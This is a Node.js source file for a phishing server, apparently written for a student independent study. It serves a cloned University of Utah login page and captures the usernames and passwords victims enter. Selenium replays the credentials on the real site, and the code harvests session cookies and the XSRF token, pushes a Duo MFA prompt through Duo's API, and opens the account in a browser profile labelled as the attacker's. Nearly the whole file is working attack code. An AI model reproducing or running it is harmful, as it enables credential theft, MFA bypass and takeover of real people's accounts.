const express = require('express');
const { Builder, By, until } = require('selenium-webdriver');
const chrome = require('selenium-webdriver/chrome');
const axios = require('axios');
const cors = require('cors');
const path = require('path');
const { exec } = require('child_process');

const app = express();
const PORT = 3000;

app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.use(express.static(path.join('/Users/harshitasamala/Desktop/Spring Semester/Independent Study/safe copy/Archive/go.utah.edu-859')));

app.get('/', (req, res) => {
    res.sendFile(path.resolve('/Users/harshitasamala/Desktop/Spring Semester/Independent Study/safe copy/Archive/go.utah.edu-859/index.html'));
});
// Serve static files from the "public" directory
app.use(express.static(path.join(__dirname, 'public')));

function openBrowser(url, profilePath) {
    exec(`open -na "Google Chrome" --args --user-data-dir="${profilePath}" "${url}"`, (error) => {
        if (error) {
            console.error(`Could not open browser: ${error}`);
        }
    });
}

app.post('/login', async (req, res) => {
    const { username, password } = req.body;

    const options = new chrome.Options();
    // Remove 'headless' to ensure the browser is visible
    // options.addArguments('headless'); // Commented out to make the browser visible

    // Specify the Chrome binary path if needed (use the following line if custom path is required)
    // options.setChromeBinaryPath("/path/to/chrome/binary"); 

    let driver = await new Builder().forBrowser('chrome').setChromeOptions(options).build();

    try {
        await driver.get('https://go.utah.edu/cas/login');
        const usernameField = await driver.wait(until.elementLocated(By.id('username')), 10000);
        await usernameField.sendKeys(username);
        const passwordField = await driver.wait(until.elementLocated(By.id('password')), 10000);
        await passwordField.sendKeys(password);

        const submitButton = await driver.findElement(By.css('input.inputareabutton.btn-submit'));
        await submitButton.click();

        await driver.sleep(5000); // Wait for any post-login processes to complete

        const cookies = await driver.manage().getCookies();
        const cookieString = cookies.map(ck => `${ck.name}=${ck.value}`).join('; ');
        const xsrfToken = cookies.find(ck => ck.name === '_xsrf')?.value || 'manually-set-token';
        const currentUrl = await driver.getCurrentUrl();
        const sid = new URL(currentUrl).searchParams.get("sid");

        await triggerDuoProcesses(cookieString, xsrfToken, sid);

        // Open the actual website with credentials in the attacker's browser
        const attackerProfilePath = '/Users/harshitasamala/Library/Application Support/Google/Chrome/Profile 1';
        openBrowser(`https://go.utah.edu/cas/login?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`, attackerProfilePath);

        // Redirect the victim to duo.html
        res.redirect('/duo.html');
    } catch (error) {
        console.error('Error during the process:', error);
        res.status(500).send('Process failed');
    } finally {
        await driver.quit();
    }
});

async function triggerDuoProcesses(sessionCookies, xsrfToken, sessionId) {
    const headers = {
        'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'Cookie': sessionCookies,
        'X-Xsrftoken': xsrfToken,
        'Origin': 'https://api-aba4bf07.duosecurity.com',
        'Referer': `https://api-aba4bf07.duosecurity.com/frame/v4/auth/prompt?sid=${sessionId}`,
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'no-cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36'
    };

    try {
        await axios.get(`https://api-aba4bf07.duosecurity.com/frame/static/shared/js/errors.js?v=d10d2`, { headers });
        await axios.get(`https://api-aba4bf07.duosecurity.com/frame/static/v4/App.js?v=ed7db`, { headers });
        const promptResponse = await axios.post(`https://api-aba4bf07.duosecurity.com/frame/v4/prompt`, new URLSearchParams({ 'sid': sessionId }).toString(), { headers });
        await axios.get(`https://api-aba4bf07.duosecurity.com/frame/v4/auth/prompt/data?post_auth_action=OIDC_EXIT&browser_features={"touch_supported":false,"platform_authenticator_status":"available","webauthn_supported":true}&sid=${sessionId}`, { headers });

        console.log('Prompt response:', promptResponse.data);
    } catch (error) {
        console.error('Error in making API calls to Duo:', error);
    }
}

app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
